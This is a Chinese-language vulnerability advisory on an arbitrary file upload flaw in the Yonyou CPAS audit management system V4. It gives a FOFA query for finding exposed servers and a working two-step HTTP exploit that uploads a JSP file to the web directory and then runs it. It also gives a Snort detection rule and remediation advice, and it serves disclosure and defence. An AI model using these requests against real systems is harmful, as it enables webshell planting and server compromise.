# 用友友数聚科技CPAS审计管理系统V4 upfile存在任意文件上传漏洞

用友友数聚科技CPAS审计管理系统V4 upfile存在任意文件上传漏洞

# 影响版本

当前所有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **body=&quot;/cpasm4/static/cap/font/iconfont.css&quot;**

**POC/EXP：**

**step1 文件上传**

```
POST /cpasm4/iWebPdf/upfile?filePath=/usr/cpasm/webapps/cpasm4/views/ HTTP/1.1
Host: 127.0.0.1:8280
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833
Content-Length: 352
Connection: keep-alive

------geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833
Content-Disposition: form-data; name="file"; filename="test28.jsp"
Content-Type: image/png

<% out.print("hello");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------geckoformboundary344fd82a960cbe4f3f0146b1f4ee3833--
```

​![image](assets/image-20260828233744-7xz49h6.png)​

**step2 查看上传后的文件**

```
GET /cpasm4/views/test28.jsp HTTP/1.1
Host: 127.0.0.1:8280
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1


```

​![image](assets/image-20260828233757-2kvijrn.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"用友友数聚科技CPAS审计管理系统V4 - /cpasm4/views/ 任意文件上传漏洞利用 (访问上传的JSP)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/cpasm4/views/"; fast_pattern;
    http.uri; content:".jsp"; distance:0;
    metadata:
        service http,
        affected_product "用友友数聚科技CPAS审计管理系统V4",
        vulnerability_type "File Upload leads to Webshell Access",
        severity "critical";
    classtype:web-application-attack;
    sid:1000742;
    rev:1;
    priority:1;
)
```

# 漏洞修复

1. **首选方案：升级版本**  
    这是最彻底的修复方式。官方已发布漏洞修复版本，请**立即升级到最新安全版本**。可访问官方网址 [`http://youdatasum.com/`](http://youdatasum.com/)​ 获取更新。
2. **临时加固措施（如无法立即升级）**

    * **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，**拦截对可疑上传接口（如包含**​**​`upfile`​**​ **、**​**​`upload`​**​**等关键词）的异常请求**，并阻断常见WebShell的请求特征。
    * **强化访问控制**：通过防火墙策略，**严格限制CPAS系统仅允许内网或特定可信IP访问**，避免直接暴露在公网。
    * **权限最小化**：审查并**降低系统内各账户的权限**，遵循最小权限原则，减少高权限账户被滥用的风险。
    * **加强监控审计**：**加强对系统上传接口及相关操作日志的监控与审计**，及时发现可疑行为。

‍
